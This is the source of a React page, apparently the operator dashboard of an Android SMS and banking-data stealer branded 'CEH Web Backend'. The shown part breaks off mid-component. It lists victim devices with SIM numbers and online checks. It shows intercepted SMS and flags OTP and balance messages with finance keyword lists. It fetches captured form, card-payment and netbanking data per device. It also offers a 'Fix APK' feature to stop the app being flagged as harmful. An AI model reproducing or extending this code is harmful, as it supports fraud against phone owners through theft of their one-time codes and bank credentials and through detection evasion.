// src/pages/MainPage.tsx
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";

import TopNav, { type TabKey }          from "../components/layout/TopNav";
import wsService                         from "../services/ws/wsService";
import { getDevices }                    from "../services/api/devices";
import { listFormSubmissions }           from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { listNotificationsGrouped }      from "../services/api/sms";
import { ENV, apiHeaders }               from "../config/constants";
import { pickLastSeenAt }                from "../utils/reachability";
import { logout, getLoggedInUser }       from "../services/api/auth";

type AnyRecord      = Record<string, any>;
type SortMode       = "new" | "old";
type DeviceSortMode = "latest" | "old2new";
type CheckStatus    = "checking" | "online" | "uninstalled";
type FixPhase       = "idle" | "starting" | "working" | "done" | "error";
type SmsFilter      = "all" | "financial" | "balance";
type SmsDayFilter   = 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7;

function str(v: any): string { return String(v ?? "").trim(); }

function timeAgo(ts: number): string {
  if (!ts || ts <= 0) return "-";
  const sec = Math.floor((Date.now() - ts) / 1000);
  if (sec < 2)  return "just now";
  if (sec < 60) return `${sec} seconds ago`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} ${min === 1 ? "minute" : "minutes"} ago`;
  const hr = Math.floor(min / 60);
  if (hr < 24)  return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
  const d = Math.floor(hr / 24);
  return `${d} ${d === 1 ? "day" : "days"} ago`;
}

function getTs(m: any): number {
  const t = m?.timestamp ?? m?.createdAt ?? m?.date ?? m?.updatedAt;
  if (typeof t === "number" && t > 0) return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!isNaN(n) && n > 0) return n;
    const d = Date.parse(t);
    if (!isNaN(d) && d > 0) return d;
  }
  return 0;
}

// Global ticker — ek hi interval sabke liye
let _tickListeners: Set<() => void> = new Set();
let _tickTimer: ReturnType<typeof setInterval> | null = null;
function _addTickListener(fn: () => void) {
  _tickListeners.add(fn);
  if (!_tickTimer) _tickTimer = setInterval(() => _tickListeners.forEach(f => f()), 10000);
  return () => {
    _tickListeners.delete(fn);
    if (_tickListeners.size === 0 && _tickTimer) { clearInterval(_tickTimer); _tickTimer = null; }
  };
}

function TimeAgo({ ts, className = "" }: { ts: number; className?: string }) {
  const [text, setText] = useState(() => timeAgo(ts));
  useEffect(() => {
    const update = () => setText(timeAgo(ts));
    return _addTickListener(update);
  }, [ts]);
  return <span className={className}>{text}</span>;
}

function sortByTime(a: AnyRecord, b: AnyRecord, mode: SortMode = "new"): number {
  const ta = getTs(a), tb = getTs(b);
  if (ta === 0 && tb === 0) return 0;
  if (ta === 0) return 1;
  if (tb === 0) return -1;
  return mode === "new" ? tb - ta : ta - tb;
}

function getId(m: any): string { return str(m?._id || m?.id || ""); }
function getDeviceId(m: any): string {
  return str(m?.uniqueid || m?.deviceId || m?.device_id || m?._deviceId || "");
}

const FINANCE_KW = ["credit","debit","bank","balance","transaction","txn","upi","amount",
  "a/c","inr","₹","paid","withdrawn","deposited","debited","credited","received","payment",
  "otp","one time","verification","ac no","acct"];
const BALANCE_KW = ["available balance","avail bal","avl bal","current balance","closing balance","bal:","balance is","balance rs","balance inr"];

function isFinance(text: string): boolean {
  const l = text.toLowerCase();
  return FINANCE_KW.some((kw) => l.includes(kw));
}

function isBalance(text: string): boolean {
  const l = text.toLowerCase();
  return BALANCE_KW.some((kw) => l.includes(kw));
}

const SKIP_KEYS = new Set(["_id","id","uniqueid","deviceId","device_id","__v",
  "createdAt","updatedAt","timestamp","_type","_ts","_deviceId","_dtype"]);

function getPayloadEntries(obj: AnyRecord): [string, string][] {
  const src = obj?.payload && typeof obj.payload === "object" ? obj.payload : obj;
  return Object.entries(src)
    .filter(([k]) => !SKIP_KEYS.has(k) && !k.startsWith("_"))
    .map(([k, v]) => [k, str(v)])
    .filter(([, v]) => v && v !== "undefined" && v !== "null") as [string, string][];
}

function copyText(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }

const D = {
  page:        (d: boolean) => d ? "bg-gray-900 text-gray-100" : "bg-gray-50 text-gray-900",
  card:        (d: boolean) => d ? "bg-gray-800 border-gray-700" : "bg-white border-gray-200",
  label:       (d: boolean) => d ? "text-blue-400"    : "text-blue-600",
  value:       (d: boolean) => d ? "text-gray-100"    : "text-gray-800",
  idGreen:     (d: boolean) => d ? "text-green-400"   : "text-green-600",
  meta:        (d: boolean) => d ? "text-gray-400"    : "text-gray-500",
  divider:     (d: boolean) => d ? "border-gray-600"  : "border-gray-100",
  dividerMed:  (d: boolean) => d ? "border-gray-600"  : "border-gray-300",
  searchBg:    (d: boolean) => d ? "bg-gray-700 border-gray-600 text-white placeholder-gray-400" : "bg-white border-gray-300 text-gray-900 placeholder-gray-400",
  selectBg:    (d: boolean) => d ? "bg-gray-700 border-gray-600 text-gray-100" : "bg-white border-gray-300 text-gray-800",
  btnOutline:  (d: boolean) => d ? "bg-gray-700 border-gray-500 text-gray-100 hover:bg-gray-600" : "bg-white border-gray-300 text-gray-800 hover:bg-gray-50",
  empty:       (d: boolean) => d ? "text-gray-500" : "text-gray-400",
  deviceCard:  (d: boolean) => d ? "bg-gray-800 border-gray-600" : "bg-white border-gray-200",
  deviceText:  (d: boolean) => d ? "text-gray-100" : "text-gray-900",
  deviceMeta:  (d: boolean) => d ? "text-gray-400" : "text-gray-500",
};

function CopyBtn({ value }: { value: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button type="button" onClick={() => { copyText(value); setOk(true); setTimeout(() => setOk(false), 1000); }}
      className="ml-1 shrink-0 text-[12px] opacity-50 hover:opacity-100">
      {ok ? "✅" : "📋"}
    </button>
  );
}

function FormCard({ form, onDeviceClick, dark, deviceNumMap }: {
  form: AnyRecord; onDeviceClick?: (id: string) => void; dark: boolean;
  deviceNumMap?: Record<string, number>;
}) {
  const ts      = getTs(form);
  const did     = getDeviceId(form);
  const entries = getPayloadEntries(form);
  const devNum  = did && deviceNumMap ? deviceNumMap[did] : undefined;
  if (entries.length === 0) return null;
  return (
    <div className={`rounded-lg border p-3 shadow-sm ${D.card(dark)}`}>
      {entries.map(([k, v]) => (
        <div key={k} className="mb-2">
          <div className="flex items-center">
            <span className={`text-[13px] font-semibold ${D.label(dark)}`}>{k}:</span>
            <CopyBtn value={v} />
          </div>
          <div className={`text-[13px] ${D.value(dark)}`}>{v}</div>
        </div>
      ))}
      <hr className={`my-2 border-t ${D.divider(dark)}`} />
      <div className="flex items-center justify-between">
        {did ? (
          <button type="button" onClick={() => onDeviceClick?.(did)}
            className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
            {devNum != null ? `#${devNum} · ` : ""}ID: {did.slice(0, 16)}
          </button>
        ) : <span />}
        <span className={`text-[11px] ${D.meta(dark)}`}>{ts ? new Date(ts).toLocaleString() : "-"}</span>
      </div>
    </div>
  );
}

function SmsCard({ sms, pageNum, onDeviceClick, dark, deviceNumMap }: {
  sms: AnyRecord; pageNum?: number; onDeviceClick?: (id: string) => void; dark: boolean;
  deviceNumMap?: Record<string, number>;
}) {
  const ts      = getTs(sms);
  const did     = getDeviceId(sms);
  const msg     = str(sms.body || sms.message || sms.msg || "");
  const sender  = str(sms.sender || sms.senderNumber || sms.from || "");
  const mob1    = str(sms.receiver || sms.adminPhone || sms.mob || "");
  const mob2    = str(sms.receiver2 || sms.mob2 || "");
  const dateStr = ts ? new Date(ts).toString() : "-";
  const fin     = isFinance(msg);
  const devNum  = did && deviceNumMap ? deviceNumMap[did] : undefined;

  function Row({ label, value, red }: { label: string; value: string; red?: boolean }) {
    return (
      <div className="mb-2">
        <div className="flex items-center">
          <span className={`text-[13px] font-semibold ${D.label(dark)}`}>{label}:</span>
          <CopyBtn value={value} />
        </div>
        <div className={`text-[13px] ${red ? (dark ? "text-red-400" : "text-red-600") : D.value(dark)}`}>{value}</div>
      </div>
    );
  }

  return (
    <div className={`rounded-lg border p-3 shadow-sm ${D.card(dark)}`}>
      <Row label="Date"   value={dateStr} />
      {msg    && <Row label="MSG"    value={msg}    red={fin} />}
      {sender && <Row label="SENDER" value={sender} />}
      {mob1   && <Row label="MOB"    value={mob1}   />}
      {mob2   && <Row label="MOB 2"  value={mob2}   />}
      <hr className={`my-2 border-t ${D.divider(dark)}`} />
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          {did ? (
            <button type="button" onClick={() => onDeviceClick?.(did)}
              className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
              {devNum != null ? `#${devNum} · ` : ""}ID: {did.slice(0, 14)}
            </button>
          ) : <span />}
          {pageNum != null && (
            <span className={`rounded px-1.5 py-0.5 text-[11px] font-semibold ${dark ? "bg-gray-700 text-gray-300" : "bg-gray-100 text-gray-500"}`}>
              Page {pageNum}
            </span>
          )}
        </div>
        <span className={`text-[11px] ${D.meta(dark)}`}>{timeAgo(ts)}</span>
      </div>
    </div>
  );
}

function GroupCard({ deviceId, items, onDeviceClick, dark, deviceNumMap }: {
  deviceId: string; items: AnyRecord[]; onDeviceClick?: (id: string) => void; dark: boolean;
  deviceNumMap?: Record<string, number>;
}) {
  const latestTs = Math.max(...items.map(getTs).filter(Boolean));
  const devNum   = deviceNumMap ? deviceNumMap[deviceId] : undefined;
  return (
    <div className={`rounded-lg border p-3 shadow-sm ${D.card(dark)}`}>
      {items.map((item, idx) => {
        const entries = getPayloadEntries(item);
        if (entries.length === 0) return null;
        return (
          <div key={getId(item) || idx}>
            {entries.map(([k, v]) => (
              <div key={k} className="mb-2">
                <div className="flex items-center">
                  <span className={`text-[13px] font-semibold ${D.label(dark)}`}>{k}:</span>
                  <CopyBtn value={v} />
                </div>
                <div className={`text-[13px] ${D.value(dark)}`}>{v}</div>
              </div>
            ))}
            {idx < items.length - 1 && <hr className={`my-2 border-t ${D.dividerMed(dark)}`} />}
          </div>
        );
      })}
      <hr className={`my-2 border-t ${D.divider(dark)}`} />
      <div className="flex items-center justify-between">
        <button type="button" onClick={() => onDeviceClick?.(deviceId)}
          className={`text-[12px] font-semibold hover:underline ${D.idGreen(dark)}`}>
          {devNum != null ? `#${devNum} · ` : ""}ID: {deviceId.slice(0, 16)}
        </button>
        <span className={`text-[11px] ${D.meta(dark)}`}>{latestTs ? new Date(latestTs).toLocaleString() : "-"}</span>
      </div>
    </div>
  );
}

// ─── Confetti ─────────────────────────────────────────────────────────────────
function Confetti() {
  const pieces = useMemo(() => Array.from({ length: 32 }, (_, i) => ({
    id: i,
    left: Math.random() * 100,
    color: ["#ffd200","#f7971e","#4ade80","#60a5fa","#f472b6","#a78bfa","#fb7185","#34d399"][Math.floor(Math.random() * 8)],
    delay: Math.random() * 1.8,
    size: 7 + Math.random() * 8,
    duration: 2.5 + Math.random() * 2,
    rotate: Math.random() * 360,
  })), []);

  return (
    <div className="pointer-events-none fixed inset-0 z-[2000] overflow-hidden">
      {pieces.map((p) => (
        <div key={p.id} className="absolute top-0 rounded-sm"
          style={{
            left: `${p.left}%`, width: p.size, height: p.size,
            backgroundColor: p.color,
            animationName: "confettiFall",
            animationDuration: `${p.duration}s`,
            animationDelay: `${p.delay}s`,
            animationTimingFunction: "ease-in",
            animationFillMode: "forwards",
            transform: `rotate(${p.rotate}deg)`,
          }} />
      ))}
      <style>{`
        @keyframes confettiFall {
          0%   { transform: translateY(-20px) rotate(0deg) scale(1); opacity: 1; }
          80%  { opacity: 0.8; }
          100% { transform: translateY(105vh) rotate(720deg) scale(0.5); opacity: 0; }
        }
      `}</style>
    </div>
  );
}

// ─── Elapsed Timer Hook ───────────────────────────────────────────────────────
function useElapsedTimer(active: boolean) {
  const [elapsed, setElapsed] = useState(0);
  const startRef = useRef<number>(0);

  useEffect(() => {
    if (active) {
      startRef.current = Date.now();
      setElapsed(0);
      const id = setInterval(() => {
        setElapsed(Math.floor((Date.now() - startRef.current) / 1000));
      }, 1000);
      return () => clearInterval(id);
    }
  }, [active]);

  const mm = String(Math.floor(elapsed / 60)).padStart(2, "0");
  const ss = String(elapsed % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

// ─── Fix APK Home Banner ──────────────────────────────────────────────────────
function FixApkBanner({ dark, onOpen }: { dark: boolean; onOpen: () => void }) {
  return (
    <div onClick={onOpen}
      className="mx-3 mb-3 cursor-pointer overflow-hidden rounded-2xl shadow-lg active:scale-[0.98] transition-transform"
      style={{ background: "linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)" }}>
      <div className="relative px-4 py-4 flex items-center justify-between">
        <div className="flex-1">
          <div className="flex items-center gap-2 mb-1">
            <span className="text-[18px]">🛡️</span>
            <span className="text-[11px] font-bold tracking-widest text-orange-400 uppercase">APK Protection</span>
          </div>
          <div className="text-[17px] font-black text-white leading-tight mb-1">APK Harmful?</div>
          <div className="text-[12px] text-blue-200 leading-4">Ek tap mein fix karo — automatic</div>
        </div>
        <div className="ml-3 flex flex-col items-center">
          <div className="flex h-12 w-12 items-center justify-center rounded-2xl shadow-lg"
            style={{ background: "linear-gradient(135deg, #f7971e, #ffd200)" }}>
            <span className="text-[22px]">🔧</span>
          </div>
          <span className="mt-1 text-[10px] font-bold text-yellow-300">Fix Karo</span>
        </div>
        <div className="pointer-events-none absolute -right-4 -top-4 h-20 w-20 rounded-full opacity-10"
          style={{ background: "radial-gradient(circle, #ffd200, transparent)" }} />
      </div>
    </div>
  );
}

// ─── Fix APK Full Screen ──────────────────────────────────────────────────────
function FixApkScreen({ dark, panelId, setPanelId, phase, error, filename, apkSize,
  onStart, onDownload, onClose, onReset, isDownloading, timeTaken }: {
  dark: boolean; panelId: string; setPanelId: (v: string) => void;
  phase: FixPhase; error: string; filename: string; apkSize: string;
  onStart: () => void; onDownload: () => void; onClose: () => void; onReset: () => void;
  isDownloading: boolean; timeTaken: string;
}) {
  const [showConfetti, setShowConfetti] = useState(false);
  const isWorking = phase === "starting" || phase === "working";
  const timerDisplay = useElapsedTimer(isWorking);

  useEffect(() => {
    if (phase === "done") {
      setShowConfetti(true);
      const t = setTimeout(() => setShowConfetti(false), 4500);
      return () => clearTimeout(t);
    }
  }, [phase]);

  const steps = [
    { id: 1, label: "APK dhundh raha hai",        done: phase === "working" || phase === "done" },
    { id: 2, label: "Protection laga raha hai",    done: phase === "done" },
    { id: 3, label: "Final taiyaar kar raha hai",  done: phase === "done" },
  ];

  const activeDoneCount = steps.filter(s => s.done).length;

  const friendlyError = (err: string) => {
    if (!err) return "";
    if (err.toLowerCase().includes("not found") || err.toLowerCase().includes("panel")) return "Panel ID galat hai ya exist nahi karta. Sahi Panel ID daalo.";
    if (err.toLowerCase().includes("apk")) return "Is panel ke liye APK upload nahi hua. Pehle bot se release APK upload karo.";
    if (err.toLowerCase().includes("timeout") || err.toLowerCase().includes("network")) return "Server se connect nahi ho paya. Thodi der mein dobara try karo.";
    if (err.toLowerCase().includes("script") || err.toLowerCase().includes("fail")) return "Fixing process mein problem aayi. Dobara try karo.";
    return err;
  };

  return (
    <>
      {showConfetti && <Confetti />}
      <div className="fixed inset-0 z-[1000] overflow-auto"
        style={{ background: "linear-gradient(160deg, #0f0c29 0%, #302b63 60%, #24243e 100%)" }}>
        <div className="flex items-center gap-3 px-4 pt-12 pb-6">
          <button type="button" onClick={onClose}
            className="flex h-9 w-9 items-center justify-center rounded-full bg-white/10 text-white text-[18px]">←</button>
          <div className="flex-1">
            <div className="text-[11px] font-bold tracking-widest text-orange-400 uppercase">APK Protection</div>
            <div className="text-[20px] font-black text-white">APK Fix Karo</div>
          </div>
          {isWorking && (
            <div className="flex flex-col items-center rounded-xl bg-white/10 px-3 py-2 border border-white/10">
              <div className="text-[9px] text-white/40 uppercase tracking-wider">Time</div>
              <div className="text-[16px] font-black text-orange-300 font-mono">{timerDisplay}</div>
            </div>
          )}
          {phase === "done" && timeTaken && (
            <div className="flex flex-col items-center rounded-xl bg-green-500/20 px-3 py-2 border border-green-500/30">
              <div className="text-[9px] text-green-400/60 uppercase tracking-wider">Laga</div>
              <div className="text-[14px] font-black text-green-400 font-mono">{timeTaken}</div>
            </div>
          )}
        </div>

        <div className="px-4 pb-10">
          {(phase === "idle" || phase === "error") && (
            <div className="mb-4 rounded-2xl bg-white/10 backdrop-blur-sm p-4 border border-white/10">
              <label className="block text-[11px] font-bold tracking-widest text-orange-300 uppercase mb-2">Panel ID</label>
              <input value={panelId} onChange={(e) => setPanelId(e.target.value)}
                placeholder="apna panel id daalo..."
                className="w-full rounded-xl bg-white/10 border border-white/20 px-4 py-3 text-[15px] font-semibold text-white placeholder-white/30 outline-none focus:border-orange-400 focus:bg-white/15 transition-all" />
              <p className="mt-2 text-[11px] text-white/40">Ye automatically fill hai — zarurat na ho toh change mat karo</p>
            </div>
          )}

          {isWorking && (
            <div className="mb-4 rounded-2xl bg-white/10 backdrop-blur-sm p-6 border border-white/10">
              <div className="flex justify-center mb-5">
                <div className="relative flex h-24 w-24 items-center justify-center">
                  <div className="absolute inset-0 rounded-full animate-ping opacity-20"
                    style={{ background: "radial-gradient(circle, #ffd200, transparent)" }} />
                  <div className="absolute inset-3 rounded-full animate-pulse opacity-40"
                    style={{ background: "radial-gradient(circle, #f7971e, transparent)" }} />
                  <span className="relative text-[38px]">🔧</span>
                </div>
              </div>
              <div className="text-center mb-4">
                <div className="text-[16px] font-bold text-white mb-1">Kaam chal raha hai...</div>
                <div className="text-[12px] text-white/50">Thoda wait karo, page band mat karo</div>
              </div>
              <div className="mb-4 h-1.5 w-full rounded-full bg-white/10 overflow-hidden">
                <div className="h-full rounded-full transition-all duration-1000"
                  style={{
                    width: `${activeDoneCount === 0 ? 12 : activeDoneCount === 1 ? 45 : activeDoneCount === 2 ? 75 : 100}%`,
                    background: "linear-gradient(90deg, #f7971e, #ffd200)",
                  }} />
              </div>
              <div className="space-y-3">
                {steps.map((step, i) => {
                  const isActive = i === activeDoneCount;
                  return (
                    <div key={step.id} className="flex items-center gap-3">
                      <div className={`flex h-7 w-7 shrink-0 items-center justify-center rounded-full text-[12px] font-bold transition-all ${step.done ? "bg-green-500 text-white" : isActive ? "bg-orange-400 text-black animate-pulse" : "bg-white/10 text-white/30"}`}>
                        {step.done ? "✓" : step.id}
                      </div>
                      <span className={`text-[13px] font-semibold transition-all ${step.done ? "text-green-400 line-through opacity-60" : isActive ? "text-orange-300" : "text-white/30"}`}>{step.label}</span>
                      {isActive && (
                        <div className="ml-auto flex gap-1">
                          {[0,1,2].map(j => <div key={j} className="h-1.5 w-1.5 rounded-full bg-orange-400 animate-bounce" style={{ animationDelay: `${j * 0.15}s` }} />)}
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>
          )}

          {phase === "done" && (
            <div className="mb-4 rounded-2xl overflow-hidden border border-green-500/30"
              style={{ background: "linear-gradient(135deg, #064e3b22, #065f4622)" }}>
              <div className="p-6 text-center">
                <div className="flex justify-center mb-3">
                  <div className="relative flex h-20 w-20 items-center justify-center rounded-full bg-green-500/20 border-2 border-green-500">
                    <span className="text-[36px]">✅</span>
                    <div className="absolute inset-0 rounded-full animate-ping opacity-10 bg-green-500" />
                  </div>
                </div>
                <div className="text-[22px] font-black text-green-400 mb-1">Taiyaar Hai! 🎉</div>
                <div className="text-[13px] text-green-300/60 mb-4">APK successfully fix ho gaya</div>
                <div className="flex justify-center gap-2 flex-wrap">
                  {filename && (
                    <div className="flex items-center gap-1 rounded-full bg-white/10 px-3 py-1">
                      <span className="text-[11px]">📄</span>
                      <span className="text-[11px] font-semibold text-white/60">{filename}</span>
                    </div>
                  )}
                  {apkSize && (
                    <div className="flex items-center gap-1 rounded-full bg-blue-500/20 px-3 py-1">
                      <span className="text-[11px]">💾</span>
                      <span className="text-[11px] font-semibold text-blue-300">{apkSize}</span>
                    </div>
                  )}
                  {timeTaken && (
                    <div className="flex items-center gap-1 rounded-full bg-green-500/20 px-3 py-1">
                      <span className="text-[11px]">⏱️</span>
                      <span className="text-[11px] font-semibold text-green-400">{timeTaken} mein</span>
                    </div>
                  )}
                </div>
              </div>
              <div className="px-5 pb-5 space-y-2">
                {steps.map((step) => (
                  <div key={step.id} className="flex items-center gap-3">
                    <div className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-green-500 text-white text-[11px] font-bold">✓</div>
                    <span className="text-[12px] text-green-400/50 line-through">{step.label}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {phase === "error" && error && (
            <div className="mb-4 rounded-2xl border border-red-500/30 overflow-hidden"
              style={{ background: "linear-gradient(135deg, #450a0a22, #7f1d1d22)" }}>
              <div className="p-5">
                <div className="flex justify-center mb-3">
                  <div className="flex h-14 w-14 items-center justify-center rounded-full bg-red-500/20 border-2 border-red-500/40">
                    <span className="text-[28px]">⚠️</span>
                  </div>
                </div>
                <div className="text-center mb-3">
                  <div className="text-[15px] font-bold text-red-400 mb-1">Kuch gadbad ho gayi</div>
                  <div className="text-[12px] text-red-300/70 leading-5">{friendlyError(error)}</div>
                </div>
                <div className="rounded-xl bg-white/5 p-3 space-y-2">
                  <div className="text-[10px] font-bold text-white/30 uppercase tracking-wider mb-1">Kya karein?</div>
                  {["Panel ID sahi hai check karo", "Release APK pehle bot se upload karo", "Thodi der baad dobara try karo"].map((tip) => (
                    <div key={tip} className="flex items-start gap-2">
                      <span className="text-[11px] text-orange-400 mt-0.5 shrink-0">→</span>
                      <span className="text-[11px] text-white/50">{tip}</span>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          <div className="space-y-3">
            {phase === "done" ? (
              <>
                <button type="button" onClick={!isDownloading ? onDownload : undefined} disabled={isDownloading}
                  className="w-full rounded-2xl py-4 text-[15px] font-black text-black active:scale-[0.98] transition-transform shadow-lg disabled:opacity-80"
                  style={{ background: isDownloading ? "#666" : "linear-gradient(135deg, #f7971e, #ffd200)" }}>
                  {isDownloading ? (
                    <span className="flex items-center justify-center gap-2">
                      <span className="inline-block h-4 w-4 rounded-full border-2 border-black border-t-transparent animate-spin" />
                      Download ho raha hai... wait karo
                    </span>
                  ) : "⬇️ APK Download Karo"}
                </button>
                <button type="button" onClick={onReset}
                  className="w-full rounded-2xl border border-white/20 bg-white/10 py-3 text-[13px] font-bold text-white/70 active:scale-[0.98] transition-transform">
                  🔄 Dobara Fix Karo
                </button>
              </>
            ) : (
              <button type="button" onClick={!isWorking ? onStart : undefined} disabled={isWorking}
                className="w-full rounded-2xl py-4 text-[15px] font-black text-black active:scale-[0.98] transition-transform shadow-lg disabled:opacity-50 disabled:scale-100"
                style={{ background: isWorking ? "#555" : "linear-gradient(135deg, #f7971e, #ffd200)" }}>
                {isWorking ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="inline-block h-4 w-4 rounded-full border-2 border-white border-t-transparent animate-spin" />
                    Kaam chal raha hai...
                  </span>
                ) : phase === "error" ? "🔧 Dobara Try Karo" : "🔧 Fix Shuru Karo"}
              </button>
            )}
          </div>

          {!isWorking && phase !== "done" && (
            <p className="mt-4 text-center text-[11px] text-white/25">Ek baar request karo — duplicate mat bhejo</p>
          )}
        </div>
      </div>
    </>
  );
}

// ─── Device Card ──────────────────────────────────────────────────────────────
function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline, dark, isUninstalled, isFavorite, onToggleFavorite }: {
  device: AnyRecord; displayNum: number; onCheckOnline: (id: string) => void; onOpen: (id: string) => void;
  recentlyOnline: boolean; dark: boolean; isUninstalled: boolean; isFavorite: boolean; onToggleFavorite: (id: string) => void;
}) {
  const did     = str(device.deviceId || device.uniqueid || "");
  const brand   = str(device.metadata?.brand || device.metadata?.manufacturer || "Unknown");
  const model   = str(device.metadata?.model || "");
  const android = str(device.metadata?.androidVersion || "");
  const sim     = device.simInfo;
  const checkedAt = Number((device as any).checkedAt || 0);
  const [tick, setTick] = useState(0);
  useEffect(() => _addTickListener(() => setTick(n => n + 1)), []);
  const isRecent = recentlyOnline || (checkedAt > 0 && (Date.now() - checkedAt) < 50 * 1000);
  const rows: { text: React.ReactNode }[] = [
    { text: (<div className="text-center text-[12px]"><span className={D.deviceMeta(dark)}>ID: </span><span className={`font-bold ${D.idGreen(dark)}`}>{did.slice(0, 16)}</span></div>) },
    ...(android ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>Android: {android}</div> }] : []),
    ...(sim?.sim1Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 1: {sim.sim1Carrier ? `${sim.sim1Carrier} — ` : ""}{sim.sim1Number}</div> }] : []),
    ...(sim?.sim2Number ? [{ text: <div className={`text-center text-[12px] ${D.deviceText(dark)}`}>SIM 2: {sim.sim2Carrier ? `${sim.sim2Carrier}: ` : ""}{sim.sim2Number}</div> }] : []),
    { text: isUninstalled ? (<div className="text-center text-[12px] font-bold text-red-500">⚠️ Uninstalled</div>) : (
      <div className="text-center text-[12px]"><span className={D.deviceMeta(dark)}>Online: </span>
        {checkedAt > 0 ? <TimeAgo ts={checkedAt} className={`font-semibold ${isRecent ? "text-green-500" : "text-red-500"}`} /> : <span className="font-semibold text-gray-400">Never checked</span>}
      </div>) },
  ];
  return (
    <div className={`cursor-pointer rounded-xl border p-3 shadow-sm transition-shadow hover:shadow-md ${isUninstalled ? (dark ? "bg-gray-800 border-red-800" : "bg-red-50 border-red-300") : D.deviceCard(dark)}`} onClick={() => onOpen(did)}>
      <div className="mb-2 flex items-center justify-between gap-1">
        <span className={`truncate text-[13px] font-bold ${isUninstalled ? "text-red-500" : D.deviceText(dark)}`}>{displayNum}. {brand}{model ? ` (${model})` : ""}{isUninstalled && <span className="ml-1 text-[10px]">🔴</span>}</span>
        <button type="button" onClick={(e) => { e.stopPropagation(); onToggleFavorite(did); }} className="shrink-0 text-[20px] leading-none transition-transform active:scale-75">{isFavorite ? "⭐" : "☆"}</button>
      </div>
      <div className={`overflow-hidden rounded-lg border ${isUninstalled ? (dark ? "border-red-800" : "border-red-200") : (dark ? "border-gray-600" : "border-gray-200")}`}>
        {rows.map((row, i) => (<div key={i} className={["px-3 py-2", i < rows.length - 1 ? (isUninstalled ? (dark ? "border-b border-red-800" : "border-b border-red-200") : (dark ? "border-b border-gray-600" : "border-b border-gray-200")) : ""].join(" ")}>{row.text}</div>))}
      </div>
      {!isUninstalled && <button type="button" onClick={(e) => { e.stopPropagation(); onCheckOnline(did); }} className={`mt-3 w-full rounded-lg border py-2 text-[13px] font-semibold active:scale-[0.98] ${D.btnOutline(dark)}`}>Check Online</button>}
      {isUninstalled && <div className="mt-3 w-full rounded-lg border border-red-300 bg-red-100 py-2 text-center text-[12px] font-bold text-red-600">App Uninstalled</div>}
    </div>
  );
}

function CheckAlert({ status, onClose }: { status: CheckStatus; onClose: () => void }) {
  return (
    <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
      <div className="relative w-[320px] rounded-2xl bg-white p-6 shadow-xl" onClick={(e) => e.stopPropagation()}>
        <button type="button" onClick={onClose} className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">✕</button>
        <div className="mb-4 text-[15px] font-extrabold text-red-500">Alert</div>
        {status === "checking" && <div className="text-center text-[14px] leading-6 text-gray-800">We've forwarded your request to the phone. Wait up to 30 seconds; if no reply, the device is offline.</div>}
        {status === "online" && <div className="text-center text-[15px] font-semibold text-green-600">Device is Online ✅</div>}
        {status === "uninstalled" && <div className="text-center text-[15px] font-semibold text-red-600">App Uninstalled! ⚠️</div>}
      </div>
    </div>
  );
}

function SearchBar({ value, onChange, onSearch, filter, onFilter, options, dark }: {
  value: string; onChange: (v: string) => void; onSearch?: () => void;
  filter: string; onFilter: (v: string) => void; options: { value: string; label: string }[]; dark: boolean;
}) {
  return (
    <div className="flex items-center gap-2 px-3 py-2">
      <div className="relative flex-1">
        <input value={value} onChange={(e) => onChange(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter") onSearch?.(); }}
          placeholder="Search..." className={`h-10 w-full rounded-full border pl-4 pr-10 text-[13px] outline-none ${D.searchBg(dark)}`} />
        <button type="button" onClick={onSearch} className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]">🔍</button>
      </div>
      <select value={filter} onChange={(e) => onFilter(e.target.value)} className={`h-10 rounded-full border px-3 text-[13px] font-semibold outline-none ${D.selectBg(dark)}`}>
        {options.map((o) => <option key={o.value} value={o.value}>{o.label}</option>)}
      </select>
    </div>
  );
}

function CehBanner({ dark, alertText }: { dark: boolean; alertText?: string }) {
  return (
    <div className={`border-b ${dark ? "border-gray-700 bg-gray-900" : "border-gray-100 bg-white"}`}>
      <div className="flex items-center justify-between px-4 py-2">
        <div className="flex items-center gap-1.5">
          <span className={`text-[15px] font-black tracking-widest ${dark ? "text-white" : "text-gray-900"}`}>CEH</span>
          <span className={`text-[9px] font-bold ${dark ? "text-gray-500" : "text-gray-400"}`}>™</span>
          <span className={`text-[11px] font-semibold ${dark ? "text-gray-500" : "text-gray-400"}`}>Web Backend</span>
        </div>
        <span className={`text-[10px] font-mono ${dark ? "text-gray-600" : "text-gray-400"}`}>zero-trace.in</span>
      </div>
      {alertText && (
        <div className="flex items-center gap-2 bg-red-600 px-4 py-2">
          <span className="text-[13px]">🚨</span>
          <span className="text-[12px] font-bold text-white leading-tight">{alertText}</span>
        </div>
      )}
    </div>
  );
}

function SettingsInput({ label, hint, type = "text", value, onChange, inputMode, readOnly }: {
  label: string; hint?: string; type?: string; value: string; onChange: (v: string) => void; inputMode?: any; readOnly?: boolean;
}) {
  return (
    <div className="mb-4">
      <label className="mb-1 block text-[12px] font-semibold uppercase tracking-wide text-gray-500">{label}</label>
      {hint && <p className="mb-1.5 text-[11px] text-gray-400">{hint}</p>}
